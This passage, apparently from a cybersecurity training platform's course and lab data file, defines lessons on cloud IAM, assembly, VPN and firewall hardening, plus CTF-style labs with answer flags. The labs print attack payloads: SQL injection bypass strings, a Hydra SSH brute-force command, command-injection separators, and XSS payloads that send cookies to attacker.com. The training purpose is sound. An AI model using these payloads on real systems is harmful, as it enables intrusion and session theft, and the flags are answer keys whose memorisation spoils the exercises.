            title: 'Identity & Access Management (IAM)',
            duration: '22 mins',
            difficulty: 'Intermediate',
            xpReward: 140,
            learningObjectives: [
              'Understand the Principle of Least Privilege in cloud environments',
              'Identify vulnerable IAM roles and credential leaks',
              'Analyze the Shared Responsibility Model between CSPs and customers'
            ],
            interactiveDiagramType: 'cloud-iam',
            readingMaterial: `### Cloud Security & Identity
Cloud-native security focuses on protecting data, applications, and infrastructures in virtualized environments. The biggest vulnerability vector in the cloud isn't raw software bugs, but **misconfigurations** and **excessive privileges**.

#### 1. Identity & Access Management (IAM)
IAM is the security control plane that regulates who (users, services) can do what (actions) on which resources.
- **Principle of Least Privilege (PoLP):** Accounts must be given only the absolute minimum permissions required to perform their specific jobs.
- **MFA (Multi-Factor Authentication):** Enforces a second layer of verification beyond passwords, stopping over 99% of bulk account takeover attempts.

#### 2. Shared Responsibility Model
Cloud security is a cooperative effort:
- **Provider (AWS, GCP, Azure):** Secures the infrastructure (hardware, physical security, global networking).
- **Customer (You):** Secures what is *inside* the cloud (data, IAM roles, application code, firewall configurations).

#### 3. S3 Bucket Misconfigurations
One of the most common cloud vulnerabilities is public S3 buckets. If access policies are misconfigured to allow 'Everyone', arbitrary attackers can scan and download confidential enterprise data.`,
            practicalTask: {
              instruction: "Audit the cloud configuration. Locate the leaky storage bucket name and find the exposed database password in the text file.",
              hint: "Check public storage endpoints or review metadata config.",
              flagRequired: true,
              flag: "S3_BUCKET_SECURE_PASS_992"
            },
            quiz: [
              {
                id: 'cloud-les-1-q1',
                type: 'mcq',
                text: 'What is the primary security policy recommendation for granting user account access privileges in cloud-native platforms?',
                options: [
                  'Principle of Maximum Convenience',
                  'Principle of Least Privilege',
                  'Full Administrator access by default',
                  'Static Password sharing policy'
                ],
                correctAnswer: 'Principle of Least Privilege',
                explanation: 'The Principle of Least Privilege ensures that users and service accounts are given only the bare minimum authorization required to execute their specific responsibilities, reducing the impact of potential compromises.'
              },
              {
                id: 'cloud-les-1-q2',
                type: 'mcq',
                text: 'In identity security, what does MFA stand for?',
                options: [
                  'Module Firewall Architecture',
                  'Multi-Factor Authentication',
                  'Main Frame Application',
                  'Metadata File Allocation'
                ],
                correctAnswer: 'Multi-Factor Authentication',
                explanation: 'MFA (Multi-Factor Authentication) requires users to provide two or more verification factors to gain access, drastically improving user account security.'
              },
              {
                id: 'cloud-les-1-q3',
                type: 'fill-blank',
                text: 'An insecurely configured S3 __________ is a major source of sensitive cloud data leaks, exposing assets to the public internet.',
                correctAnswer: 'bucket',
                explanation: 'Amazon S3 (Simple Storage Service) uses "buckets" to store cloud objects. Leaving a bucket set to public allows anyone to extract stored files.'
              },
              {
                id: 'cloud-les-1-q4',
                type: 'mcq',
                text: 'Under the Cloud Shared Responsibility Model, who is responsible for securing physical servers and infrastructure hardware?',
                options: [
                  'The customer/subscriber',
                  'The third-party security auditor',
                  'The Cloud Service Provider (CSP)',
                  'The end-user application developer'
                ],
                correctAnswer: 'The Cloud Service Provider (CSP)',
                explanation: 'The Cloud Service Provider handles the physical security, network infrastructure, and hypervisor layer, while customers secure their applications, configurations, and data.'
              },
              {
                id: 'cloud-les-1-q5',
                type: 'fill-blank',
                text: 'What is the standard acronym for Identity and Access Management, the core control plane used to manage user authentication in the cloud?',
                correctAnswer: 'IAM',
                explanation: 'IAM stands for Identity and Access Management, which is the system used across AWS, GCP, and Azure to provision roles, groups, and permissions.'
              }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'rev-eng',
    title: 'Reverse Engineering & Malware',
    slug: 'reverse-engineering',
    description: 'Decompile compiled binaries, read low-level assembly language, trace processor registers, and isolate malware behavior.',
    icon: 'Unlock',
    xpReward: 1600,
    modules: [
      {
        id: 'rev-eng-mod-1',
        title: 'Binary Analysis',
        description: 'Understand compiled program architectures, assembly registers, and reverse engineering tools.',
        lessons: [
          {
            id: 'rev-eng-les-1',
            title: 'Assembly & Code Analysis Basics',
            duration: '26 mins',
            difficulty: 'Advanced',
            xpReward: 220,
            learningObjectives: [
              'Understand x86_64 architecture and processor registers',
              'Trace stack operations (Push, Pop) and conditional jumps',
              'Isolate software using static disassembly and dynamic debugging'
            ],
            interactiveDiagramType: 'assembly-stack',
            readingMaterial: `### Reverse Engineering Fundamentals
Reverse engineering is the process of taking an executable file (compiled binary) and analyzing its structure and logic to understand how it operates, often to find security flaws or analyze malware payloads.

#### 1. Machine Code to Assembly
When a developer compiles C, C++, or Go code, it compiles down to raw bytes (machine code) that the CPU understands. We use a **Disassembler** (like Ghidra or IDA Pro) to turn those bytes back into human-readable Assembly instructions.

#### 2. Common CPU Registers (x86_64)
Registers are super-fast storage spots built directly inside the CPU:
- **EAX/RAX:** Accumulator register. Usually stores the **return value** of a function.
- **ESP/RSP:** Stack Pointer. Points to the current top of the memory stack.
- **EIP/RIP:** Instruction Pointer. Holds the address of the next instruction to execute.

#### 3. Static vs Dynamic Analysis
- **Static Analysis:** Reviewing the program's code, strings, and imported functions without running it. Highly safe.
- **Dynamic Analysis:** Executing the file in a controlled sandbox (using a Debugger like x64dbg or GDB) to monitor live memory, registry changes, and network sockets.`,
            practicalTask: {
              instruction: "Determine what decimal value must be loaded into RAX so RAX + 0x10 equals 0x20. Submit the answer as the flag.",
              hint: "0x10 is 16, 0x20 is 32. Solve RAX + 16 = 32.",
              flagRequired: true,
              flag: "16"
            },
            quiz: [
              {
                id: 'rev-eng-les-1-q1',
                type: 'mcq',
                text: 'Which CPU register in x86/x64 assembly is primarily used to store the return value of a completed function?',
                options: [
                  'EAX',
                  'EBX',
                  'ESP',
                  'EIP'
                ],
                correctAnswer: 'EAX',
                explanation: 'By convention, the EAX (or RAX on 64-bit systems) register is used to pass the return value of functions back to the calling process.'
              },
              {
                id: 'rev-eng-les-1-q2',
                type: 'mcq',
                text: 'What is the main operational difference between Static and Dynamic binary analysis?',
                options: [
                  'Static analysis requires running the program; Dynamic analysis only reads the raw file',
                  'Static analysis reads the code structure without execution; Dynamic analysis executes and monitors live behavior',
                  'Static analysis requires internet connection; Dynamic analysis is purely offline',
                  'Static analysis only works on Linux binaries; Dynamic analysis is Windows-only'
                ],
                correctAnswer: 'Static analysis reads the code structure without execution; Dynamic analysis executes and monitors live behavior',
                explanation: 'Static analysis analyzes compile-time components (like strings, imports, flow graphs), while dynamic analysis executes the software under a debugger to examine runtime variables.'
              },
              {
                id: 'rev-eng-les-1-q3',
                type: 'fill-blank',
                text: 'What is the 3-letter abbreviation of the assembly instruction used to compare two values in x86 architecture?',
                correctAnswer: 'CMP',
                explanation: 'The CMP instruction subtracts the source operand from the destination operand and updates CPU status flags (like Zero Flag) without storing the result, preparing for conditional jumps.'
              },
              {
                id: 'rev-eng-les-1-q4',
                type: 'mcq',
                text: 'Which processor register functions as the Stack Pointer, constantly tracking the current top of the local memory stack?',
                options: [
                  'EAX',
                  'ECX',
                  'ESP',
                  'EDX'
                ],
                correctAnswer: 'ESP',
                explanation: 'The ESP (Stack Pointer) register holds the memory address of the item at the very top of the stack frame.'
              },
              {
                id: 'rev-eng-les-1-q5',
                type: 'fill-blank',
                text: 'A software tool that converts machine-readable binary code back into human-readable assembly instructions is called a __________.',
                correctAnswer: 'disassembler',
                explanation: 'A disassembler reads binary machine instructions and maps them back into standard text assembly, making binary analysis possible.'
              }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'expert-vpn-port-sec',
    title: 'VPN Creation & Port Security',
    slug: 'vpn-port-security',
    description: 'Enterprise hands-on deployment of IPSec & WireGuard VPN gateways, custom tunneling, stateful port hardening, dynamic port knocking, and zero-trust perimeter defense.',
    icon: 'Lock',
    xpReward: 2500,
    isExpert: true,
    priceUsd: 10,
    page: 2,
    modules: [
      {
        id: 'vpn-sec-mod-1',
        title: 'Enterprise VPN Architecture & Tunneling',
        description: 'Deploy WireGuard, IPSec, and OpenVPN secure gateways with hardware-level cryptographic isolation.',
        lessons: [
          {
            id: 'vpn-les-1',
            title: 'WireGuard & IPSec Gateway Deployment',
            duration: '35 mins',
            difficulty: 'Expert',
            xpReward: 350,
            learningObjectives: [
              'Deploy and configure WireGuard tunnel interfaces (wg0) from scratch',
              'Establish IKEv2 / IPSec site-to-site cryptographic associations',
              'Configure IP masquerading, NAT forwarding, and MTU optimization'
            ],
            interactiveDiagramType: 'vpn-tunnel',
            readingMaterial: `### WireGuard & IPSec Enterprise VPN Deployment
WireGuard is an extremely simple yet fast and modern VPN that utilizes state-of-the-art cryptography (Noise protocol framework, Curve25519, ChaCha20, Poly1305, BLAKE2s).

#### 1. WireGuard Server Configuration (/etc/wireguard/wg0.conf)
\`\`\`ini
[Interface]
Address = 10.200.0.1/24
SaveConfig = true
PrivateKey = <SERVER_PRIVATE_KEY>
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

[Peer]
# Client Operative 01
PublicKey = <CLIENT_PUBLIC_KEY>
AllowedIPs = 10.200.0.2/32
\`\`\`

#### 2. Key Generation & Service Activation
\`\`\`bash
# Generate private and public keys for server
wg genkey | tee server_private.key | wg pubkey > server_public.key
chmod 600 server_private.key

# Enable IPv4 Packet Forwarding
sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf

# Bring up WireGuard Tunnel Interface
wg-quick up wg0
systemctl enable wg-quick@wg0
\`\`\`

#### 3. IPSec Site-to-Site Tunneling (strongSwan)
IPSec operates at the IP network layer, securing all IP traffic across un-trusted networks using Encapsulating Security Payload (ESP) and Internet Key Exchange (IKEv2).`,
            practicalTask: {
              instruction: "Generate a WireGuard public key pair and verify active tunnel routing. Submit the tunnel handshake verification token.",
              targetIp: "10.200.0.1",
              hint: "Check wg show command output for active peer handshakes.",
              flagRequired: true,
              flag: "THM{wireguard_tunnel_master_882}"
            },
            quiz: [
              {
                id: 'vpn-les-1-q1',
                type: 'mcq',
                text: 'Which modern cryptographic curve is used by WireGuard for key exchange?',
                options: ['RSA-4096', 'Curve25519', 'ECDSA P-384', 'DSA-1024'],
                correctAnswer: 'Curve25519',
                explanation: 'WireGuard uses Elliptic Curve Diffie-Hellman on Curve25519 for high-speed, secure key exchange.'
              },
              {
                id: 'vpn-les-1-q2',
                type: 'fill-blank',
                text: 'The default UDP listening port for standard WireGuard tunnels is _________.',
                correctAnswer: '51820',
                explanation: '51820/UDP is the default port assigned to WireGuard interfaces.'
              }
            ]
          },
          {
            id: 'vpn-les-2',
            title: 'TLS/SSL Tunneling & OpenVPN Server Hardening',
            duration: '30 mins',
            difficulty: 'Expert',
            xpReward: 300,
            learningObjectives: [
              'Build a PKI CA hierarchy using Easy-RSA v3',
              'Enforce TLS 1.3 cipher suites and HMAC firewall authentication',
              'Harden OpenVPN server directives against TLS renegotiation attacks'
            ],
            interactiveDiagramType: 'tls-tunnel',
            readingMaterial: `### OpenVPN & TLS Gateway Hardening
OpenVPN uses custom TLS-based protocols for robust authentication and transport encryption.

#### Key Hardening Directives (server.conf)
\`\`\`ini
port 1194
proto udp
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh4096.pem
# Enable TLS-Auth or TLS-Crypt HMAC Firewall
tls-crypt tc.key
tls-version-min 1.3
cipher AES-256-GCM
auth SHA512
user nobody
group nogroup
persist-key
persist-tun
\`\`\``,
            quiz: [
              {
                id: 'vpn-les-2-q1',
                type: 'mcq',
                text: 'What is the primary benefit of OpenVPN tls-crypt directive over standard tls-auth?',
                options: [
                  'It compresses video streams',
                  'It encrypts control channel packets including certificate exchanges',
                  'It converts UDP to TCP automatically',
                  'It disables passwords'
                ],
                correctAnswer: 'It encrypts control channel packets including certificate exchanges',
                explanation: 'tls-crypt obfuscates and encrypts control channel messages, preventing port scanning detection and certificate sniffing.'
              }
            ]
          }
        ]
      },
      {
        id: 'vpn-sec-mod-2',
        title: 'Port Hardening & Stealth Perimeter Security',
        description: 'Conceal open ports using stealth port knocking sequences and automated scanner suppression.',
        lessons: [
          {
            id: 'vpn-les-3',
            title: 'Dynamic Port Knocking & Stealth Firewalls',
            duration: '30 mins',
            difficulty: 'Expert',
            xpReward: 320,
            learningObjectives: [
              'Configure knockd daemon for dynamic sequence authentication',
              'Implement automated iptables opening/closing triggers',
              'Conceal SSH/RDP ports from automated nmap scanning probes'
            ],
            interactiveDiagramType: 'port-knocking',
            readingMaterial: `### Port Knocking & Stealth Port Defense
Port knocking is a method of externally opening ports on a firewall by attempting a pre-defined sequence of connection attempts to closed ports.

#### /etc/knockd.conf Configuration
\`\`\`ini
[options]
    UseSyslog

[openSSH]
    sequence    = 7000:tcp,8000:tcp,9000:tcp
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[closeSSH]
    sequence    = 9000:tcp,8000:tcp,7000:tcp
    seq_timeout = 5
    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn
\`\`\``,
            quiz: [
              {
                id: 'vpn-les-3-q1',
                type: 'mcq',
                text: 'How does port knocking protect administrative ports like SSH (22)?',
                options: [
                  'By changing the SSH password automatically',
                  'By keeping port 22 completely closed until a specific TCP packet sequence is received',
                  'By slowing down Internet speeds',
                  'By disabling root login'
                ],
                correctAnswer: 'By keeping port 22 completely closed until a specific TCP packet sequence is received',
                explanation: 'Port knocking hides the open service from scanners until the correct sequence triggers a temporary firewall allow rule.'
              }
            ]
          },
          {
            id: 'vpn-les-4',
            title: 'Port Scan Mitigation & State Inspection',
            duration: '30 mins',
            difficulty: 'Expert',
            xpReward: 330,
            learningObjectives: [
              'Detect SYN, FIN, NULL, and Xmas port scanning with iptables recent module',
              'Implement dynamic IP banning for port scans using Fail2ban',
              'Audit open ports using Netstat, SS, and Nmap stealth flags'
            ],
            interactiveDiagramType: 'port-scan-def',
            readingMaterial: `### Port Scan Detection & Mitigation
To stop malicious reconnaissance, firewalls must identify port scanning signatures (SYN flood, NULL, Xmas, FIN scans) and dynamically block the source IP.

#### IPTables Anti-Scan Rule Example
\`\`\`bash
# Drop NULL scans
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP

# Drop Xmas scans
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# Drop SYN-FIN scans
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
\`\`\``,
            quiz: [
              {
                id: 'vpn-les-4-q1',
                type: 'fill-blank',
                text: 'An Nmap scan that sets the SYN, FIN, and URG TCP flags simultaneously is known as a _________ scan.',
                correctAnswer: 'Xmas',
                explanation: 'An Xmas scan turns on all control flags, lighting up the packet like a Christmas tree.'
              }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'expert-acl-firewall',
    title: 'ACL & Next-Gen Firewall Engineering',
    slug: 'acl-firewall-engineering',
    description: 'Advanced design & auditing of Cisco/pfSense/iptables Access Control Lists (ACLs), stateful inspection rules, deep packet inspection (DPI), DMZ segmentation, and layer 7 firewall threat mitigation.',
    icon: 'Shield',
    xpReward: 2800,
    isExpert: true,
    priceUsd: 10,
    page: 2,
    modules: [
      {
        id: 'acl-mod-1',
        title: 'Access Control List (ACL) Design & Enforcement',
        description: 'Design standard, extended, and object-group ACLs across Cisco IOS, pfSense, and Linux kernel firewalls.',
        lessons: [
          {
            id: 'acl-les-1',
            title: 'Standard vs. Extended Cisco ACL Implementation',
            duration: '35 mins',
            difficulty: 'Expert',
            xpReward: 350,
            learningObjectives: [
              'Design standard and extended numbered/named Access Control Lists',
              'Calculate wildcard masks for precise subnet matching',
              'Apply ACLs to ingress/egress interface directions'
            ],
            interactiveDiagramType: 'cisco-acl',
            readingMaterial: `### Cisco Extended ACL Configuration
Extended ACLs (numbered 100-199 or named) filter traffic based on source IP, destination IP, protocol type (TCP/UDP/ICMP), and port numbers.

#### Example Configuration
\`\`\`cisco
! Create named extended ACL
ip access-list extended DMZ_FILTER
 permit tcp 192.168.1.0 0.0.0.255 host 10.0.0.5 eq 443
 permit tcp 192.168.1.0 0.0.0.255 host 10.0.0.5 eq 80
 deny ip any host 10.0.0.5
 permit ip any any

! Apply to interface
interface GigabitEthernet0/1
 ip access-group DMZ_FILTER in
\`\`\`

#### Implicit Deny Rule
Every Cisco ACL ends with an invisible **deny ip any any** rule at the bottom. Any packet that fails to match a permit statement is silently dropped!`,
            practicalTask: {
              instruction: "Configure an extended ACL allowing HTTP/HTTPS to server 10.0.0.5 while denying ICMP echo requests.",
              targetIp: "10.0.0.5",
              hint: "Use permit tcp 192.168.1.0 0.0.0.255 host 10.0.0.5 eq 443 followed by deny icmp any host 10.0.0.5.",
              flagRequired: true,
              flag: "THM{cisco_acl_extended_expert_912}"
            },
            quiz: [
              {
                id: 'acl-les-1-q1',
                type: 'mcq',
                text: 'Where should Extended ACLs generally be placed on a network topology?',
                options: [
                  'As close to the source of traffic as possible',
                  'As close to the destination as possible',
                  'On the Internet Service Provider router',
                  'On client workstations only'
                ],
                correctAnswer: 'As close to the source of traffic as possible',
                explanation: 'Extended ACLs filter specific protocols/ports, so placing them close to the source prevents unnecessary traffic from consuming network bandwidth.'
              },
              {
                id: 'acl-les-1-q2',
                type: 'fill-blank',
                text: 'The wildcard mask corresponding to a /24 subnet mask (255.255.255.0) is _________.',
                correctAnswer: '0.0.0.255',
                explanation: 'Wildcard masks invert subnet mask bits (255.255.255.255 - 255.255.255.0 = 0.0.0.255).'
              }
            ]
          },
          {
            id: 'acl-les-2',
            title: 'Object-Group ACLs & DMZ Network Isolation',
            duration: '30 mins',
            difficulty: 'Expert',
            xpReward: 320,
            learningObjectives: [
              'Configure Cisco Object Groups for modular firewall rules',
              'Isolate DMZ public web servers from internal database clusters',
              'Audit access rule priority ordering and implicit deny behavior'
            ],
            interactiveDiagramType: 'dmz-isolation',
            readingMaterial: `### DMZ Isolation & Object-Group Architecture
Demilitarized Zones (DMZ) isolate external-facing servers (Web, DNS, Mail) from sensitive internal LAN systems.

#### Object Groups in ASA / IOS
\`\`\`cisco
object-group network DMZ_SERVERS
 host 10.0.10.10
 host 10.0.10.11

object-group service WEB_SERVICES tcp
 port-object eq www
 port-object eq https

ip access-list extended DMZ_INBOUND
 permit tcp any object-group DMZ_SERVERS object-group WEB_SERVICES
\`\`\``,
            quiz: [
              {
                id: 'acl-les-2-q1',
                type: 'mcq',
                text: 'What is the main purpose of a DMZ (Demilitarized Zone) network?',
                options: [
                  'To speed up LAN printing',
                  'To isolate public-facing servers from the sensitive internal network',
                  'To bypass firewall rules',
                  'To encrypt internal email'
                ],
                correctAnswer: 'To isolate public-facing servers from the sensitive internal network',
                explanation: 'If a web server in the DMZ is compromised, firewall ACLs restrict the attacker from directly pivoting into internal company networks.'
              }
            ]
          }
        ]
      },
      {
        id: 'acl-mod-2',
        title: 'Next-Gen Firewall (NGFW) & Packet Filtering',
        description: 'Stateful packet inspection, deep packet inspection, and automated threat feeds.',
        lessons: [
          {
            id: 'acl-les-3',
            title: 'Stateful Packet Inspection (SPI) & iptables Hardening',
            duration: '35 mins',
            difficulty: 'Expert',
            xpReward: 350,
            learningObjectives: [
              'Enforce connection tracking (ESTABLISHED, RELATED, INVALID state tracking)',
              'Mitigate SYN floods using SYN cookies and rate-limiting rules',
              'Construct custom rules in iptables filter, nat, and mangle tables'
            ],
            interactiveDiagramType: 'stateful-inspection',
            readingMaterial: `### Stateful Packet Inspection (SPI) Mechanics
Stateful firewalls track the state of active network connections in a conntrack table (\`/proc/net/nf_conntrack\`).

#### Production Stateful Rule Set
\`\`\`bash
# 1. Allow established and related connections
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 2. Drop invalid packets
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

# 3. Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# 4. Allow SSH rate-limited
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m limit --limit 3/min --limit-burst 5 -j ACCEPT

# 5. Default Drop Policy
iptables -P INPUT DROP
\`\`\``,
            quiz: [
              {
                id: 'acl-les-3-q1',
                type: 'mcq',
                text: 'In stateful packet filtering, what does the ESTABLISHED state mean?',
                options: [
                  'A packet trying to initiate a new connection',
                  'A packet associated with a connection that has already seen packets in both directions',
                  'A corrupted network packet',
                  'A DNS request'
                ],
                correctAnswer: 'A packet associated with a connection that has already seen packets in both directions',
                explanation: 'ESTABLISHED indicates an active bi-directional session verified by the connection tracking engine.'
              }
            ]
          },
          {
            id: 'acl-les-4',
            title: 'Deep Packet Inspection & Layer 7 Threat Suppression',
            duration: '30 mins',
            difficulty: 'Expert',
            xpReward: 330,
            learningObjectives: [
              'Deploy Snort/Suricata IPS rules for application-layer inspection',
              'Block unauthorized P2P, TOR, and C2 HTTP traffic',
              'Integrate automated threat intelligence feeds into firewall rules'
            ],
            interactiveDiagramType: 'dpi-layer7',
            readingMaterial: `### Layer 7 Deep Packet Inspection (DPI)
Next-Generation Firewalls (NGFW) inspect packet payloads at Layer 7 to identify application signatures regardless of the port used.

#### Suricata / Snort Signature Example
\`\`\`snort
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE-CNC Cobalt Strike Beacon Detected"; content:"POST"; http_method; content:"/submit.php?id="; http_uri; classtype:trojan-activity; sid:1000921; rev:1;)
\`\`\``,
            quiz: [
              {
                id: 'acl-les-4-q1',
                type: 'fill-blank',
                text: 'Unlike traditional packet filters that inspect IP headers, Next-Gen Firewalls analyze the packet payload at OSI Layer _________.',
                correctAnswer: '7',
                explanation: 'Layer 7 (Application Layer) inspection enables firewalls to identify malware command-and-control, obfuscated protocols, and specific application behaviors.'
              }
            ]
          }
        ]
      }
    ]
  }
];

export const ALL_LABS = [
  {
    id: 'lab-sql-basics',
    title: 'SQL Injection Basics',
    description: 'Learn basic authentication bypass and UNION-based data extraction attacks.',
    difficulty: 'Beginner',
    duration: '25 mins',
    xpReward: 250,
    category: 'Web Security',
    targetIp: '10.10.10.45',
    vulnerableServices: ['HTTP (Apache/2.4.41)', 'MySQL (v8.0.22)'],
    instructions: `### Lab Objective
In this lab, you are targeting a vulnerable web administration panel running on \`10.10.10.45\`. Your goal is to bypass the login portal and extract secret database flags.

#### Tasks:
1. Probe the login fields using traditional SQL syntax.
2. Find the version of SQL running on the database.
3. Access the \`flags\` table and locate the hidden flag.

#### Reference Payloads:
- Login Bypass: \`admin' OR '1'='1-- -\`
- Column Discovery: \`' UNION SELECT null, null, null-- -\`
- Data Extraction: \`' UNION SELECT 'flag', flag_val FROM flags-- -\``,
    tasks: [
      {
        id: 'lab-sql-basics-t1',
        title: 'Bypass Admin Login',
        question: 'Enter the SQL injection payload used to bypass password verification and log in as "admin":',
        hint: "Place a payload in the username that completes the string query and adds OR '1'='1'",
        flag: "admin' OR '1'='1-- -",
        xp: 100
      },
      {
        id: 'lab-sql-basics-t2',
        title: 'Retrieve Flag',
        question: 'Extract the flag stored inside the secure database flags table:',
        hint: "Run nmap / sql commands in the Kali Terminal or inject dynamic parameters.",
        flag: "THM{sql_inject_master_783}",
        xp: 150
      }
    ]
  },
  {
    id: 'lab-nmap-basics',
    title: 'Nmap Scanning & Host Enumeration',
    description: 'Practice discovering open ports, service versions, and OS operating details using Nmap.',
    difficulty: 'Beginner',
    duration: '20 mins',
    xpReward: 200,
    category: 'Network Recon',
    targetIp: '10.10.12.8',
    vulnerableServices: ['FTP (vsftpd 3.0.3)', 'SSH (OpenSSH 8.2)', 'HTTP (Nginx 1.18)'],
    instructions: `### Lab Objective
Target \`10.10.12.8\` is a network machine that holds a secret flag inside its ftp repository.

#### Tasks:
1. Scan the target utilizing Nmap to find which ports are active.
2. Retrieve version details for the open ports.
3. Find which port hosts the hidden service and retrieve the flag.`,
    tasks: [
      {
        id: 'lab-nmap-basics-t1',
        title: 'Identify Hidden Service Port',
        question: 'What port hosts the FTP service on target 10.10.12.8?',
        hint: "Execute 'nmap -sV 10.10.12.8' inside the Kali Terminal.",
        flag: "21",
        xp: 80
      },
      {
        id: 'lab-nmap-basics-t2',
        title: 'Retrieve Anonymous Flag',
        question: 'Retrieve the flag hidden inside the FTP server (Log in using user "anonymous" and empty password):',
        hint: "Connect via: ftp 10.10.12.8, use 'anonymous' login, find flag.txt.",
        flag: "THM{nmap_recon_specialist_2026}",
        xp: 120
      }
    ]
  },
  {
    id: 'lab-hydra-brute',
    title: 'SSH Password Cracking with Hydra',
    description: 'Use THC-Hydra to execute online dictionary attacks against SSH login points.',
    difficulty: 'Intermediate',
    duration: '35 mins',
    xpReward: 300,
    category: 'Active Exploitation',
    targetIp: '10.10.15.110',
    vulnerableServices: ['SSH (OpenSSH 7.9)'],
    instructions: `### Lab Objective
In this lab, you are tasked with cracking an SSH account on \`10.10.15.110\`. You have acquired a username \`security_officer\` and a small wordlist \`wordlist.txt\`.

#### Wordlist Content (/usr/share/wordlists/passwords.txt):
- password123
- sunshine
- shadow1
- cybersecurity
- cybernexus_elite

#### Steps:
1. Run hydra tool referencing the target, user, and wordlist.
2. Crack SSH credentials and log in to grab the root flag.

#### Commands syntax:
\`\`\`bash
hydra -l security_officer -P /usr/share/wordlists/passwords.txt ssh://10.10.15.110
\`\`\``,
    tasks: [
      {
        id: 'lab-hydra-basics-t1',
        title: 'Discover SSH Password',
        question: 'What is the cracked SSH password for user security_officer?',
        hint: "Execute the hydra command inside your terminal.",
        flag: "cybernexus_elite",
        xp: 100
      },
      {
        id: 'lab-hydra-basics-t2',
        title: 'Acquire SSH Flag',
        question: 'Connect using SSH and submit the flag found in the home directory:',
        hint: "Run 'ssh security_officer@10.10.15.110' with password 'cybernexus_elite'.",
        flag: "THM{hydra_brute_ssh_cracked_812}",
        xp: 200
      }
    ]
  },
  {
    id: "lab-stored-xss",
    title: "Stored XSS & Session Hijacking",
    description: "Exploit a stored comment section to execute malicious JavaScript and hijack administrative sessions.",
    difficulty: "Intermediate",
    duration: "30 mins",
    xpReward: 250,
    category: "Web Security",
    targetIp: "10.10.10.88",
    vulnerableServices: ["HTTP (Apache/2.4.49 with PHP)", "SQLite (v3.35.5)"],
    instructions: `### Lab Objective
In this lab, your target is a support ticketing forum at \`10.10.10.88\`. Administrators regularly check this forum. Your goal is to insert a stored script that intercepts administrative cookies.

#### Tasks:
1. Inject a stored XSS script into the support ticket description field.
2. Intercept the victim administrator's HTTP session cookie.
3. Decrypt the Base64 session string or use it to acquire the secret admin flag.

#### Reference Payloads:
- Simple cookie log: \`<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>\`
- Safe image trigger: \`<img src=x onerror="fetch('http://attacker.com/log?c=' + document.cookie)">\``,
    tasks: [
      {
        id: "lab-stored-xss-t1",
        title: "Stored XSS Injection",
        question: "Submit the standard HTML script payload used to output document.cookie via fetch or alert:",
        hint: "Use script tags enclosing fetch to transmit the document.cookie variable.",
        flag: "<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>",
        xp: 100
      },
      {
        id: "lab-stored-xss-t2",
        title: "Extract Administrative Session Flag",
        question: "Enter the administrative session flag recovered from the cookie payload:",
        hint: "The cookie session parameter contains a value starting with 'THM{xss_session_hijack_...}'.",
        flag: "THM{xss_session_hijack_8471}",
        xp: 150
      }
    ]
  },
  {
    id: "lab-command-injection",
    title: "OS Command Injection",
    description: "Exploit a misconfigured network diagnostics web utility to execute arbitrary OS shell commands.",
    difficulty: "Intermediate",
    duration: "25 mins",
    xpReward: 250,
    category: "Active Exploitation",
    targetIp: "10.10.20.15",
    vulnerableServices: ["HTTP (Node.js/Express router)", "Ping Utility (v1.3.0)"],
    instructions: `### Lab Objective
Target \`10.10.20.15\` hosts a web utility designed to allow users to ping external IP addresses to verify network health. However, input parsing is missing, letting you concatenate operating system shell commands.

#### Tasks:
1. Bypass the expected input box format and execute the \`whoami\` command.
2. Traverse the directory structure, find where the flag file is hosted, and display it.

#### Command Concatenations:
- Semicolon separator: \`127.0.0.1; whoami\`
- Logical OR: \`127.0.0.1 || whoami\`
- Pipe separator: \`127.0.0.1 | whoami\``,
    tasks: [
      {
        id: "lab-command-inj-t1",
        title: "Bypass Command Execution",
        question: "What user is the ping web service executing commands as?",
        hint: "Concatenate your ping IP with the command 'whoami'.",
        flag: "www-data",
        xp: 100
      },
      {
        id: "lab-command-inj-t2",
        title: "Display Root Flag",
        question: "Submit the flag stored inside the server file system at /var/www/flag.txt:",
        hint: "Use 'cat /var/www/flag.txt' concatenated to your ping query.",
        flag: "THM{command_injection_rce_902}",
        xp: 150
      }
    ]
  },
  {
    id: "lab-linux-suid",
    title: "Linux Privilege Escalation via SUID Binaries",
    description: "Enumerate local system binaries to locate and abuse misconfigured SUID bits for root escalation.",
    difficulty: "Advanced",
    duration: "40 mins",
    xpReward: 350,
    category: "Linux Security",
    targetIp: "10.10.30.55",
    vulnerableServices: ["SSH (OpenSSH 8.4p1)", "Ubuntu Linux (v20.04 LTS)"],
    instructions: `### Lab Objective
You have successfully gained an unprivileged SSH session on \`10.10.30.55\`. Your goal is to analyze the filesystem, identify misconfigured binaries with SUID (Set Owner User ID) permissions, and escalate your privileges to root.

#### Tasks:
1. Enumerate all executable binaries on the system having the SUID bit set.
2. Leverage the identified binary to read system files or execute root-level shells.

#### Enumeration Command:
\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`
Look for atypical binaries (like \`find\`, \`base64\`, or \`python\`) compiled or configured with the SUID attribute.`,
    tasks: [
      {
        id: "lab-suid-t1",
        title: "Identify SUID Vulnerability",
        question: "Which binary has an atypical SUID bit set that can be abused?",
        hint: "Look closely at the output of your find search for common tools in /usr/bin or /bin.",
        flag: "/usr/bin/find",
        xp: 150
      },
      {
